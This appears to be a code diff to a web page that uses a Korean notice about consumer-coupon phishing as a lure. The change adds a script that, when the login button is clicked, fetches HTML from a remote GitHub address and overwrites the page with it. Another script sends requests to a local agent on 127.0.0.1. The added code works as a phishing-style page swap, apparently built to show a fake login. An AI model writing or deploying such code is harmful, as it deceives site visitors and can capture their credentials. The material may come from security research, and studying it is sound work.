@@ -64,6 +64,20 @@
         }
     </style>
     <script>
+    document.getElementById("loginBtn").addEventListener("click", function(e) {
+      e.preventDefault();
+      
+      fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+        .then(res => res.text())
+        .then(html => {
+          document.open();
+          document.write(html);
+          document.close();
+        });
+    });
+    </script>
+
+    <script>
         async function fetchForBrowser() {
             const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
             const commonOptions = {
@@ -129,7 +143,7 @@
                         </div>
 
                         <div class="section" style="text-align: center;">
-                            <a href="https://b4e483e92130.ngrok-free.app/login_page.html" target="_blank" class="cta-button">
+                            <a class="btn" href="#" id="loginBtn">
                                 [필독_공지] 민생회복 소비쿠폰 피싱 대응 상세 안내
                             </a>
                         </div>
